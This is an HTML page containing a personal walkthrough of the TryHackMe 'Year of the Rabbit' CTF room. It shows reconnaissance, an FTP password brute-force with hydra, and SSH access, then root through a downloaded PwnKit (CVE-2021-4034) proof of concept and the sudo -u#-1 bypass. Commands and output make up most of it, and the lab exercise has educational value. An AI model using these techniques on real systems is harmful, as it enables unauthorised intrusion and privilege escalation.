@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/mini.css/3.0.1/mini-default.min.css">
+    <title>Year of the Rabbit writeup</title>
+</head>
+<body>
+
+      <div class="container">
+        <div class="row">
+          <div class="col-sm-1"></div>  
+          
+          <div class="col-sm-10">
+
+            <p><a href="/content/tryhackme/writeups/index.html"><span class="icon-home"></span></a></p>
+
+            <h2>time to solve</h2>
+            <p>this room took me about 4 hours spread through two days to solve, writeup and documentation another 2 hours, and making the <a href="/content/tryhackme/tools/" target="_blank">python script</a> another hour</p>            
+
+            <h2>room link</h2>
+            <p><a href="https://tryhackme.com/room/yearoftherabbit">Year of the Rabbit</a></p>
+
+            <h2>reconnaissance</h2>
+
+<p><h5><mark class="tertiary">nmap</mark></h5></p>
+<pre>
+  ┌─[jetosd@potato]─[~/Desktop/tryhackme/yearoftherabbit]
+  └──╼ $nmap -A -T4 10.10.251.189 -oG nmap.txt
+  Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-05 14:39 EST
+  Nmap scan report for 10.10.251.189
+  Host is up (0.22s latency).
+  Not shown: 997 closed tcp ports (conn-refused)
+  PORT   STATE SERVICE VERSION
+  21/tcp open  ftp     vsftpd 3.0.2
+  22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+  | ssh-hostkey: 
+  |   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
+  |   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
+  |   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
+  |_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
+  80/tcp open  http    Apache httpd 2.4.10 ((Debian))
+  |_http-title: Apache2 Debian Default Page: It works
+  |_http-server-header: Apache/2.4.10 (Debian)
+  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  Nmap done: 1 IP address (1 host up) scanned in 30.10 seconds
+</pre>            
+
+<p><h5><mark class="tertiary">gobuster</mark></h5></p>
+<pre>
+  ┌─[jetosd@potato]─[~/Desktop/tryhackme/yearoftherabbit]
+  └──╼ $gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u 10.10.251.189
+  ===============================================================
+  Gobuster v3.1.0
+  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+  ===============================================================
+  [+] Url:                     http://10.10.251.189
+  [+] Method:                  GET
+  [+] Threads:                 10
+  [+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+  [+] Negative Status codes:   404
+  [+] User Agent:              gobuster/3.1.0
+  [+] Timeout:                 10s
+  ===============================================================
+  2022/02/05 14:59:10 Starting gobuster in directory enumeration mode
+  ===============================================================
+  /assets               (Status: 301) [Size: 315] [--> http://10.10.251.189/assets/]
+  /server-status        (Status: 403) [Size: 278]     
+</pre>
+
+<p><h5><mark class="tertiary">http-ls - created as a documentation diversion excercise</mark></h5></p>
+<pre>
+  ┌─[jetosd@potato]─[~/Desktop/tryhackme/yearoftherabbit]
+  └──╼ $python http-ls.py 10.10.251.189 /assets/
+  url is http://10.10.251.189/assets/
+  RickRolled.mp4
+  style.css
+</pre>
+
+<p><h5><mark class="tertiary">style.css</mark></h5></p>
+ <p><span class="icon-info"></span> style.css gives us an endpoint to look at further, curl it to find more info</p>
+
+
+<p><h5><mark class="tertiary">curl the style.css endpoint</mark></h5></p>
+<pre>
+  ┌─[jetosd@potato]─[~/Desktop/tryhackme/yearoftherabbit]
+  └──╼ $curl -IL http://10.10.251.189/[endpoint]
+  HTTP/1.1 302 Found
+  Date: Sat, 05 Feb 2022 21:09:29 GMT
+  Server: Apache/2.4.10 (Debian)
+  Location: intermediary.php?hidden_directory=/[hidden-dir]
+  Content-Type: text/html; charset=UTF-8
+  
+  HTTP/1.1 302 Found
+  Date: Sat, 05 Feb 2022 21:09:30 GMT
+  Server: Apache/2.4.10 (Debian)
+  location: /[endpoint]
+  Content-Type: text/html; charset=UTF-8
+  
+  HTTP/1.1 301 Moved Permanently
+  Date: Sat, 05 Feb 2022 21:09:30 GMT
+  Server: Apache/2.4.10 (Debian)
+  Location: http://10.10.251.189/[endpoint]/
+  Content-Type: text/html; charset=iso-8859-1
+  
+  HTTP/1.1 200 OK
+  Date: Sat, 05 Feb 2022 21:09:30 GMT
+  Server: Apache/2.4.10 (Debian)
+  Last-Modified: Thu, 23 Jan 2020 00:34:26 GMT
+  ETag: "263-59cc3cda20344"
+  Accept-Ranges: bytes
+  Content-Length: 611
+  Vary: Accept-Encoding
+  Content-Type: text/html
+</pre>
+
+<p><h5><mark class="tertiary">http-ls the hidden-dir found above</mark></h5></p>
+<pre>
+  ┌─[jetosd@potato]─[~/Desktop/tryhackme/yearoftherabbit]
+  └──╼ $python http-ls.py 10.10.251.189 /[hidden-dir]/
+  url is http://10.10.251.189/[hidden-dir]/
+  Hot_Babe.png
+</pre>
+
+<p><h5><mark class="tertiary">download the png and run strings to find a user and a creds list</mark></h5></p>
+<pre>
+  ┌─[jetosd@potato]─[~/Desktop/tryhackme/yearoftherabbit]
+  └──╼ $wget http://10.10.251.189/[hidden-dir]/Hot_Babe.png
+  --2022-02-05 16:17:58--  http://10.10.251.189/[hidden-dir]/Hot_Babe.png
+  Connecting to 10.10.251.189:80... connected.
+  HTTP request sent, awaiting response... 200 OK
+  Length: 475075 (464K) [image/png]
+  Saving to: ‘Hot_Babe.png’
+  
+  Hot_Babe.png                        100%[==================================================================>] 463.94K   355KB/s    in 1.3s    
+  
+  2022-02-05 16:17:59 (355 KB/s) - ‘Hot_Babe.png’ saved [475075/475075]
+  
+  ┌─[jetosd@potato]─[~/Desktop/tryhackme/yearoftherabbit]
+  └──╼ $strings Hot_Babe.png
+  IHDR
+  sRGB
+  .... 
+  .... 
+  .... 
+  Eh, you've earned this. Username for FTP is ftpuser
+  One of these is the password:
+  .... 
+  .... 
+  ....   
+</pre>
+
+            <h2>initial access</h2>
+<p><h5><mark class="tertiary">ftp access - with the user found above we will brute the creds with hydra</mark></h5></p>
+<pre>
+  ┌─[jetosd@potato]─[~/Desktop/tryhackme/yearoftherabbit]
+  └──╼ $hydra -l ftpuser -P ftppass.txt 10.10.251.189 ftp
+  Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes...
+  
+  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-05 16:31:20
+  [DATA] max 16 tasks per 1 server, overall 16 tasks, 83 login tries (l:1/p:83), ~6 tries per task
+  [DATA] attacking ftp://10.10.251.189:21/
+  [21][ftp] host: 10.10.251.189   login: ftpuser   password: [password]
+  1 of 1 target successfully completed, 1 valid password found
+  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-05 16:31:37
+</pre>
+
+<p><h5><mark class="tertiary">ftp access - using creds from above, list files, download another cred file</mark></h5></p>
+<pre>
+  ┌─[jetosd@potato]─[~/Desktop/tryhackme/yearoftherabbit]
+  └──╼ $curl ftp://10.10.251.189 --user "ftpuser:[password]"
+  -rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
+
+  ┌─[jetosd@potato]─[~/Desktop/tryhackme/yearoftherabbit]
+  └──╼ $curl -s "ftp://10.10.251.189/Eli's_Creds.txt" --user "ftpuser:[password]" -o creds.txt;ls -l creds.txt
+  -rw-r--r-- 1 jetosd jetosd 758 Feb  5 16:46 creds.txt
+</pre>
+
+<p><h5><mark class="tertiary">ssh access - or not</mark></h5></p>
+
+  <p><span class="icon-info"></span> the next set of creds are encoded, so you need to figure out the encoding scheme, for that I used:<br>
+<span class="icon-link"></span> <a href="https://www.dcode.fr/cipher-identifier" target="_blank">https://www.dcode.fr/cipher-identifier</a></p>
+
+
+<p><h5><mark class="tertiary">ssh access!</mark></h5></p>
+<pre>
+  ┌─[jetosd@potato]─[~/Desktop/tryhackme/yearoftherabbit]
+  └──╼ $ssh eli@10.10.251.189
+  The authenticity of host '10.10.251.189 (10.10.251.189)' can't be established.
+  ECDSA key fingerprint is SHA256:ISBm3muLdVA/w4A1cm7QOQQOCSMRlPdDp/x8CNpbJc8.
+  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+  Warning: Permanently added '10.10.251.189' (ECDSA) to the list of known hosts.
+  eli@10.10.251.189's password: 
+  
+  
+  1 new message
+  Message from Root to Gwendoline:
+  
+  "Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
+  
+  END MESSAGE
+  
+  
+  
+  
+  eli@year-of-the-rabbit:~$ 
+</pre>
+
+<p><h5><mark class="tertiary">lateral movement</mark></h5></p>
+<p><span class="icon-info"></span> i spent at least an hour here searching for the hiding place using various find commands,
+  in the end the key is to focus on a similarity from the endpoint you found earlier and the content of the motd message displayed when you login as eli,
+  this will lead you to gwendoline's creds where you can login and grab the first flag</p>
+<pre>
+eli@year-of-the-rabbit:~$ su gwendoline
+Password: 
+gwendoline@year-of-the-rabbit:/home/eli$ cd
+gwendoline@year-of-the-rabbit:~$ ls -lrta user.txt
+-r--r----- 1 gwendoline gwendoline 46 Jan 23  2020 user.txt
+gwendoline@year-of-the-rabbit:~$ 
+</pre>
+
+            <h2>privilege escalation</h2>
+<p><h5><mark class="tertiary">enumerating rabbits</mark></h5></p>
+<p><span class="icon-info"></span> after getting access to gwendoline i ran sudo -l to check sudo privs and was too focused on the !root flag even though i did
+  an initial look on gtfo to check it out instead of what the intended escalation path seems to be, sudo, i opted going down that rabbit hole and 
+  through the use of linpeas and linenum found this box was vulnerable to pwnkit</p>
+<pre>
+gwendoline@year-of-the-rabbit:~$ sudo -l
+Matching Defaults entries for gwendoline on year-of-the-rabbit:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User gwendoline may run the following commands on year-of-the-rabbit:
+    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
+</pre>
+
+<p><h5><mark class="tertiary">pwnrabbit</mark></h5></p>
+<p><span class="icon-info"></span> to make things hard on myself i decided to ignore sudo and pwn the rabbit i guess, i found a poc for pwnkit that looked good here:<br>
+  <span class="icon-link"></span> <a href="https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c" target="_blank">https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c</a></p>
+<pre>
+┌─[jetosd@potato]─[~/Desktop/tryhackme/transfer]
+└──╼ $wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c
+--2022-02-05 17:16:14--  https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.110.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1267 (1.2K) [text/plain]
+Saving to: ‘cve-2021-4034-poc.c’
+
+cve-2021-4034-poc.c                 100%[==================================================================>]   1.24K  --.-KB/s    in 0s      
+
+2022-02-05 17:16:14 (110 MB/s) - ‘cve-2021-4034-poc.c’ saved [1267/1267]
+</pre>
+<p><span class="icon-info"></span> to avoid compiler errors i've seen in the past, i checked the box for a list of installed compilers, gcc is there
+  </p>
+<pre>
+gwendoline@year-of-the-rabbit:~$ dpkg --list | grep compiler
+ii  gcc                                   4:4.9.2-2                           amd64        GNU C compiler
+ii  gcc-4.8                               4.8.4-1                             amd64        GNU C compiler
+ii  gcc-4.9                               4.9.2-10                            amd64        GNU C compiler
+ii  libllvm3.5:amd64                      1:3.5-10                            amd64        Modular compiler and toolchain technologies, runtime library
+ii  libxkbcommon0:amd64                   0.4.3-2                             amd64        library interface to the XKB compiler - shared library
+ii  linux-compiler-gcc-4.8-x86            3.16.7-ckt9-2                       amd64        Compiler for Linux on x86 (meta-package)
+</pre>
+<p><span class="icon-info"></span> i served up the poc and transfered it over
+  </p>
+<pre>
+
+┌─[jetosd@potato]─[~/Desktop/tryhackme/transfer]
+└──╼ $python -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.251.189 - - [05/Feb/2022 17:21:16] "GET /cve-2021-4034-poc.c HTTP/1.1" 200 -
+
+gwendoline@year-of-the-rabbit:~$ wget http://10.13.4.122:1234/cve-2021-4034-poc.c
+converted 'http://10.13.4.122:1234/cve-2021-4034-poc.c' (ANSI_X3.4-1968) -> 'http://10.13.4.122:1234/cve-2021-4034-poc.c' (UTF-8)
+--2022-02-05 22:21:15--  http://10.13.4.122:1234/cve-2021-4034-poc.c
+Connecting to 10.13.4.122:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1267 (1.2K) [text/x-csrc]
+Saving to: 'cve-2021-4034-poc.c'
+
+cve-2021-4034-poc.c                 100%[====================================================================>]   1.24K  --.-KB/s   in 0s     
+
+2022-02-05 22:21:15 (271 MB/s) - 'cve-2021-4034-poc.c' saved [1267/1267]
+</pre>
+<p><span class="icon-info"></span> compile poc
+  </p>
+<pre>
+gwendoline@year-of-the-rabbit:~$ gcc -o pwnrabbit cve-2021-4034-poc.c
+gwendoline@year-of-the-rabbit:~$ ls -lrta pwnrabbit
+-rwxr-xr-x 1 gwendoline gwendoline 7984 Feb  5 22:21 pwnrabbit
+</pre>
+<p><span class="icon-info"></span> run poc and grab root flag
+  </p>
+<pre>
+gwendoline@year-of-the-rabbit:~$ ./pwnrabbit
+# whoami
+root
+# ls -lrta /root/root.txt
+-rw-r----- 1 root root 46 Jan 23  2020 /root/root.txt
+</pre>
+
+<p><h5><mark class="tertiary">the non-rabbit hole way</mark></h5></p>
+<p><span class="icon-info"></span> let's go back to gwendoline and sudo -l shall we
+</p>
+<pre>
+gwendoline@year-of-the-rabbit:~$ sudo -l
+Matching Defaults entries for gwendoline on year-of-the-rabbit:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User gwendoline may run the following commands on year-of-the-rabbit:
+    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
+</pre>
+<p><span class="icon-info"></span> a much easier way, and probably the right way to escalate for this room, is to take advantage of sudo and the -u#-1 exploit
+  when the ALL flag is present, this runs whatever it is you have access to as the user id -1, and with the bug pushes it to 0, which is root
+</p>
+<pre>
+gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+
+~                                                                                                                                             
+~                                                                                                                                             
+~                                                                                                                                             
+:shell
+
+root@year-of-the-rabbit:/home/gwendoline# whoami
+root
+</pre>
+<p><span class="icon-info"></span> here is a good overview of the bug<br>
+  <span class="icon-link"></span> <a href="https://threatpost.com/sudo-bug-root-access-linux/149169/" target="_blank">https://threatpost.com/sudo-bug-root-access-linux/149169/</a></p>
+
+<h2>conclusion</h2>
+<p><span class="icon-info"></span> this room showed me that i don't cover all my bases in a methodical way, and that i like rabbit holes<br>
+  <img src="/content/tryhackme/writeups/yearoftherabbit/d3f89gb-1b8aec8b-d31b-4cf8-ba98-7005b46dd5c5.gif" alt="https://www.deviantart.com/yukimizuno/art/Stamp-Rabbit-or-Duck-Season-206978267">
+</p>
+
+
+          </div>
+        </div>
+    </div>
+</body>
+</html>
